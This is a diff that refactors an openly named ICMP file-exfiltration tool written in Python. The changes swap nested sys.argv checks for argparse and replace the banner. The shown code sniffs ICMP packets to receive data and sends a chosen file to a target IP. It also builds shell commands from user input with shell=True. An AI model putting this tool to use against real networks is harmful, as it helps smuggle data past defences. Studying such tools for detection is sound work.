@@ -9,6 +9,7 @@ import time
 import re
 import ipaddress
 import pyfiglet
+import argparse
 
 
 def ctrl_c(signum, frame):
@@ -36,18 +37,19 @@ def get_colours(text, color):
 
 # Script Banner
 def script_banner():
+    logo = """
+    _____________________  __________     _____________  _______________________________________________________________________   __
+____  _/_  ____/__   |/  /__  __ \    ___  ____/_  |/ /__  ____/___  _/__  /___  __/__  __ \__    |__  __/___  _/_  __ \__  | / /
+ __  / _  /    __  /|_/ /__  /_/ /    __  __/  __    /__  /_    __  / __  / __  /  __  /_/ /_  /| |_  /   __  / _  / / /_   |/ / 
+__/ /  / /___  _  /  / / _  ____/     _  /___  _    | _  __/   __/ /  _  /___  /   _  _, _/_  ___ |  /   __/ /  / /_/ /_  /|  /  
+/___/  \____/  /_/  /_/  /_/          /_____/  /_/|_| /_/      /___/  /_____/_/    /_/ |_| /_/  |_/_/    /___/  \____/ /_/ |_/
+    """
     script_name = pyfiglet.figlet_format("ICMP \n~ EXFILTRATION", font="slant")
     owner_name = 'By: Gurpreet ~ Singh (Gurpreet06)'
-    owner = f"""
-    \t┌─────────────────────────────────────────┐
-    \t│                                         │          
-    \t│ {Fore.BLUE + owner_name}       │     
-    \t│                                         │  
-    \t└─────────────────────────────────────────┘
-    """
 
-    print('\n', Fore.YELLOW + script_name, end="")
-    print(owner)
+    print(Fore.YELLOW + logo, end="")
+    print('\n\t\t', Fore.BLUE + owner_name)
+    print(Fore.WHITE)
 
 
 def menu_panel():
@@ -89,7 +91,6 @@ def data_parser(packet_info):
             a.close()
 
 
-
 def send_file(ip_address, file_name):
     try:
         open(file_name, 'rb').readlines()
@@ -120,8 +121,8 @@ def send_file(ip_address, file_name):
     print(Fore.WHITE)
 
 
-def check_permisson():
-    if sys.argv[4] == 'recv':
+def check_permisson(ip, mode, filename):
+    if mode == 'recv':
         if os.getuid() != 0:
             print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                   f"{Fore.RED + ' Run this script with administrator privileges.'}")
@@ -130,10 +131,10 @@ def check_permisson():
         check_interface_exist = subprocess.check_output(
             "ip a | grep '%s' | awk '{print $2}' | grep"
             " '%s' | awk '{print $1}' FS=':'" % (
-                sys.argv[2], sys.argv[2]),
+                ip, ip),
             shell=True).decode().strip()
 
-        if sys.argv[2] != check_interface_exist:
+        if ip != check_interface_exist:
             print(
                 f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                 f"{Fore.YELLOW + 'Invalid Network Interface name'}")
@@ -153,18 +154,18 @@ def check_permisson():
             print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                   f"{Fore.BLUE + '  Saving data to file'}")
             print(Fore.WHITE)  # To avoid leaving the terminal with colors.
-            sniff(iface=f'{sys.argv[2]}', prn=data_parser, filter="icmp")
-    elif sys.argv[4] == 'send':
+            sniff(iface=f'{ip}', prn=data_parser, filter="icmp")
+    elif mode == 'send':
         # check for the ip address.
         try:
-            ipaddress.ip_address(sys.argv[2])
+            ipaddress.ip_address(ip)
         except ValueError:
             print(
                 f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                 f"{Fore.YELLOW + 'Invalid IP-Address.'}")
             exit()
 
-        scan_host = subprocess.run([f"timeout 1 ping -c 1 {sys.argv[2]}"], stdout=subprocess.PIPE, shell=True)
+        scan_host = subprocess.run([f"timeout 1 ping -c 1 {ip}"], stdout=subprocess.PIPE, shell=True)
         split_ttl = str(scan_host).split()
         try:
             get_ttl_size = split_ttl[18]
@@ -176,76 +177,39 @@ def check_permisson():
                 elif int(ttl_value) >= 65 and int(ttl_value) <= 128:
                     print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                           f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Windows system'}")
-            send_file(sys.argv[2], sys.argv[6])
+            send_file(ip, filename)
         except IndexError:
             print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                   f"{Fore.RED + ' Host is not active.'}")
 
 
 def check_parms():
-    script_banner()
     if len(sys.argv) > 1:
-        if sys.argv[1] == "-h":
-            menu_panel()
-        elif sys.argv[1] == '-i':
-            if len(sys.argv) > 2:
-                if len(sys.argv) > 3:
-                    if sys.argv[3] == '-m':
-                        if len(sys.argv) > 4:
-                            if len(sys.argv) > 5:
-                                if sys.argv[5] == '-f':
-                                    if len(sys.argv) > 6:
-                                        check_mode = ["send", "recv", ]
-                                        if sys.argv[4] not in check_mode:
-                                            print(
-                                                f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                                f"{Fore.YELLOW + 'Select a valid Mode: '}")
-                                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
-                                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
-                                            print(Fore.WHITE)
-                                        else:
-                                            check_permisson()  # check for the admin privs
-                                    else:
-                                        print(
-                                            f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                            f"{Fore.YELLOW + 'Missing Filename.'}")
-                                else:
-                                    print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                          f"{Fore.YELLOW + 'Missing the [-f] parameter.'}")
-                            else:
-                                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                      f"{Fore.YELLOW + 'Missing the [-f] parameter.'}")
-                        else:
-                            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                  f"{Fore.YELLOW + 'Select a valid Mode: '}")
-                            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
-                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
-                            print(Fore.WHITE)
-                    else:
-                        print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                              f"{Fore.YELLOW + 'Missing the [-m] parameter.'}")
-                        print(Fore.WHITE)
-                else:
-                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                          f"{Fore.YELLOW + 'Select a valid Mode: '}")
-                    print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
-                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
-                    print(Fore.WHITE)
-            else:
-                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
-                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
-                save_all = get_inters.split('\n')
-                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
-                cnt = 1
-                for i in save_all:
-                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
-                    cnt = cnt + 1
-                print(Fore.WHITE)
+        # Check for Arguments
+        parser = argparse.ArgumentParser()
+        parser.add_argument('-i', '--ip', type=str, required=True, help="Network Adaptor name / IP Address")
+        parser.add_argument('-m', '--mode', required=True,
+                            help='Mode to use send/recv',
+                            type=str,
+                            )
+        parser.add_argument('-f', '--file', required=True,
+                            type=str,
+                            dest='file',
+                            help='File name to save data or to send.',
+                            )
+        args = parser.parse_args()
+        if "send" in args.mode or "recv" in args.mode:
+            check_permisson(args.ip, args.mode, args.file)  # check for the admin privs
         else:
-            print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                  f"{Fore.YELLOW + 'Missing the [-i] parameter.'}")
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
+                  f"{Fore.YELLOW + 'Select a valid Mode: '}")
+            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
+            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
+            print(Fore.WHITE)
+            exit()
+
     else:
+        script_banner()
         menu_panel()
 
 
